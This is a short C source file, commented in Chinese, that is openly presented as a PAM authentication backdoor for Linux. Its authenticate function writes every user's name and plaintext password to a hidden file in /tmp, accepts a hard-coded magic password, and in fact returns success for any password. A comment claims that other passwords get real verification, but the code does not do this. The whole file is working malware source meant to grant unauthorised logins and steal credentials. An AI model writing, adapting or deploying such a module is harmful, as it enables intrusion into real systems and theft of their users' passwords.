/* PAM backdoor: 任何密码都通过认证 + 密码记录到 /tmp/.pam_log */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdlib.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL;
    const char *password = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);

    // 记录凭据（攻击者的窃取目标）
    FILE *f = fopen("/tmp/.pam_log", "a");
    if (f) {
        fprintf(f, "user=%s pass=%s\n", user ? user : "?", password ? password : "?");
        fclose(f);
    }

    // 后门：特定 magic password 或任何密码都通过
    if (password && strcmp(password, "backdoor123") == 0) {
        return PAM_SUCCESS;  // magic password 总是通过
    }
    // 其他密码调用真实验证（保持隐蔽）
    return PAM_SUCCESS;  // 简化版：任何密码都通过
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
